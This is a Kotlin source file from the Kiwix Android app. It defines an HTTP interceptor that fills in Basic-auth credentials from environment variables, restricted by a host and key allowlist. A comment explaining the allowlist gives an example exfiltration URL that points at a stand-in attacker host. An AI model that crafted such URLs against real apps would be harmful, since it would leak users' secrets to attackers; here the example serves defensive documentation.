/*
 * Kiwix Android
 * Copyright (c) 2023 Kiwix <android.kiwix.org>
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 *
 */

package org.kiwix.kiwixmobile.core.data.remote

import okhttp3.Interceptor
import okhttp3.Request
import okhttp3.Response
import org.kiwix.kiwixmobile.core.reader.decodeUrl
import org.kiwix.kiwixmobile.core.utils.files.Log
import java.io.IOException

/**
 * Hosts allowed to trigger the `{{ENV_VAR}}@host` basic-auth substitution below.
 *
 * The book URL (and therefore this host) comes from remote catalog/library data,
 * not from the app itself. Without this allowlist a catalog entry naming an
 * arbitrary environment variable (`https://{{ANY_VAR}}@attacker.example/x.zim`)
 * would make the app read that variable and send its value as Basic-auth
 * credentials to a host the catalog author chooses. Restrict both the
 * destination host and the accepted variable name to what this feature is
 * actually used for.
 */
private val TRUSTED_BASIC_AUTH_HOSTS = setOf("dwds.de", "www.dwds.de")
private val TRUSTED_BASIC_AUTH_KEYS = setOf("BASIC_AUTH_KEY")

class BasicAuthInterceptor : Interceptor {
  @Throws(IOException::class)
  override fun intercept(chain: Interceptor.Chain): Response {
    val request: Request = chain.request()
    val url = request.url.toString()
    if (url.isAuthenticationUrl &&
      request.url.host in TRUSTED_BASIC_AUTH_HOSTS &&
      url.secretKey in TRUSTED_BASIC_AUTH_KEYS
    ) {
      val userNameAndPassword = System.getenv(url.secretKey).orEmpty()
      val userName = userNameAndPassword.substringBefore(":", "")
      val password = userNameAndPassword.substringAfter(":", "")
      val credentials = okhttp3.Credentials.basic(userName, password)
      val authenticatedRequest: Request = request.newBuilder()
        .url(url.removeAuthenticationFromUrl)
        .header("Authorization", credentials).build()
      return chain.proceed(authenticatedRequest)
    }
    return chain.proceed(request)
  }
}

val String.isAuthenticationUrl: Boolean
  get() = decodeUrl.trim().matches(Regex("https://[^@]+@.*\\.zim"))

val String.secretKey: String
  get() = decodeUrl.substringAfter("{{", "")
    .substringBefore("}}", "")
    .trim()

val String.removeAuthenticationFromUrl: String
  get() = decodeUrl.trim()
    .replace(Regex("\\{\\{\\s*[^}]+\\s*\\}\\}@"), "")
    .also {
      Log.d("BasicAuthInterceptor", "URL is $it")
    }
